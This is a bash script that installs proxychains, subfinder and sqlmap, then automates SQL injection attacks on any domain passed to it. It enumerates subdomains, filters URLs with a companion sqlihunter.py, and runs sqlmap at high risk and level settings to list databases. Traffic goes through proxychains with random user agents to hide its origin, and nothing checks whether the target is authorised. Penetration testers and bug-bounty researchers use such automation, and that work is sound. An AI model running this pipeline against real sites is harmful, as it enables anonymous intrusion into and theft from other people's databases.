#!/bin/bash

# Script name: sqli-checker.sh
# Description: This script checks for necessary dependencies, installs them if missing, and then runs a series of commands for SQL injection testing.

# Function to check and install dependencies
install_dependency() {
    local dep=$1
    local install_cmd=$2

    if ! command -v $dep &> /dev/null; then
        echo "$dep is not installed. Installing..."
        eval $install_cmd
        if ! command -v $dep &> /dev/null; then
            echo "Failed to install $dep. Please install it manually."
            exit 1
        fi
    else
        echo "$dep is already installed."
    fi
}

# Detect the operating system
OS=$(uname -s)

# Define installation commands based on OS
case "$OS" in
    Linux)
        echo "Detected Linux OS"
        PKG_MANAGER="sudo apt-get"
        install_dependency "proxychains" "$PKG_MANAGER update && $PKG_MANAGER install -y proxychains"
        install_dependency "subfinder" "go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
        install_dependency "python3" "$PKG_MANAGER update && $PKG_MANAGER install -y python3"
        install_dependency "sqlmap" "pip3 install sqlmap"
        ;;
    Darwin)
        echo "Detected macOS"
        PKG_MANAGER="brew"
        install_dependency "proxychains" "$PKG_MANAGER install proxychains-ng"
        install_dependency "subfinder" "$PKG_MANAGER install subfinder"
        install_dependency "python3" "$PKG_MANAGER install python"
        install_dependency "sqlmap" "pip3 install sqlmap"
        ;;
    CYGWIN*|MINGW32*|MSYS*|MINGW*)
        echo "Detected Windows"
        PKG_MANAGER="choco"
        install_dependency "proxychains" "$PKG_MANAGER install proxychains"
        install_dependency "subfinder" "$PKG_MANAGER install subfinder"
        install_dependency "python3" "$PKG_MANAGER install python"
        install_dependency "sqlmap" "pip install sqlmap"
        ;;
    *)
        echo "Unsupported OS: $OS"
        exit 1
        ;;
esac

# Check if sqlihunter.py exists
if [ ! -f "./sqlihunter.py" ]; then
    echo "sqlihunter.py not found in the current directory. Please ensure it is available."
    exit 1
fi

# Function to run the command series
run_commands() {
    local domain=$1
    local output_file=$2

    echo "Running SQL injection tests on domain: $domain"

    # Define and execute the command series
    proxychains subfinder -d $domain -all -silent | proxychains python3 sqlihunter.py -o sqliurls.txt
    sqlmap -m sqliurls.txt --batch --dbs --risk 2 --level 5 --random-agent | tee -a $output_file

    echo "Results saved to $output_file"
}

# Parse arguments
while getopts "d:o:" opt; do
    case ${opt} in
        d )
            domain=$OPTARG
            ;;
        o )
            output_file=$OPTARG
            ;;
        \? )
            echo "Usage: $0 -d target_domain -o output_file"
            exit 1
            ;;
    esac
done

# Validate arguments
if [ -z "$domain" ] || [ -z "$output_file" ]; then
    echo "Both target domain and output file must be specified."
    echo "Usage: $0 -d target_domain -o output_file"
    exit 1
fi

# Run the command series
run_commands $domain $output_file
